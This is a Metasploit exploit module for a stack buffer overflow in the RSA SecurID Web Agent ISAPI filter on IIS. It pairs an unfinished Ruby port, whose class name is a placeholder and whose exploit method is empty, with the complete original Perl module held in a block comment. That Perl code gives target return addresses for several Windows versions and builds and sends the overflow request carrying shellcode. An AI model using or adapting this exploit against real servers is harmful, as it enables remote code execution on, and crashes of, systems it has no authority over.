require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS RSA WebAgent Redirect Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the SecurID Web
				Agent for IIS. This ISAPI filter runs in-process with
				inetinfo.exe, any attempt to exploit this flaw will result
				in the termination and potential restart of the IIS service.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x09\x0a\x0b\x0d\x20\x22\x23\x25\x26\x27\x2b\x2f\x3a\x3b\x3c\x3d\x3e\x3f\x40\x5c\x5a",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rsa_iiswebagent_redirect;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'IIS RSA WebAgent Redirect Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'URL'   => [1, 'DATA', 'The path to the DLL', '/WebID/IISWebAgentIF.dll'],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => 
						"\x00\x09\x0a\x0b\x0d\x20\x22\x23\x25\x26\x27\x2b\x2f".
						"\x3a\x3b\x3c\x3d\x3e\x3f\x40\x5c". "Z",
						
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the SecurID Web Agent for IIS.
	This ISAPI filter runs in-process with inetinfo.exe, any attempt to
	exploit this flaw will result in the termination and potential restart
	of the IIS service.
}),

	'Refs'  =>
	  [
	  	# Anyone got a patch/advisory/solution URL?
	  ],
	  
	'Targets' =>
	  [
	  	# Version-specific return addresses
		['RSA WebAgent 5.2', 996, 0x1001e694],
		['RSA WebAgent 5.3', 992, 0x10010e89],
		
		# Generic return addresses
		['RSA WebAgent 5.2 on Windows 2000 English', 996, 0x75022ac4],
		['RSA WebAgent 5.3 on Windows 2000 English', 992, 0x75022ac4],
		
		['RSA WebAgent 5.2 on Windows XP SP0-SP1 English', 996, 0x71ab1d54],
		['RSA WebAgent 5.3 on Windows XP SP0-SP1 English', 992, 0x71ab1d54],
		
		['RSA WebAgent 5.2 on Windows XP SP2 English', 996, 0x71ab9372],
		['RSA WebAgent 5.3 on Windows XP SP2 English', 992, 0x71ab9372],
		
		['RSA WebAgent 5.2 on Windows 2003 English SP0', 996, 0x7ffc0638],
		['RSA WebAgent 5.3 on Windows 2003 English SP0', 992, 0x7ffc0638],

	  ],

	'Keys' => ['rsa'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET ".$self->GetVar('URL')."?GetPic?image=msf HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /RSA Web Access Authentication/)
	{
		$self->PrintLine("[*] Found IISWebAgentIF.dll ;)");
		return $self->CheckCode('Detected');
	} else {

		$self->PrintLine("The IISWebAgentIF.dll ISAPI does not appear to be installed");
		return $self->CheckCode('Safe');
	}
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[ $target_idx ];

	$self->PrintLine("[*] Attempting to exploit target ".$target->[0]);


	my $pattern = Pex::Text::AlphaNumText(8192);
	# Just don't ask.
	$pattern =~ s/\d|Z/A/ig;
	
	substr($pattern, $target->[1]    , 4, pack('V', $target->[2]));
	substr($pattern, $target->[1] - 4, 2, "\xeb\x06");
	substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

	my $request =
	  "GET ".$self->GetVar('URL')."?Redirect?url=$pattern HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	$s->Recv(-1, 10);
	$self->Handler($s);
	$s->Close();
	return;
}


=end


end
end	
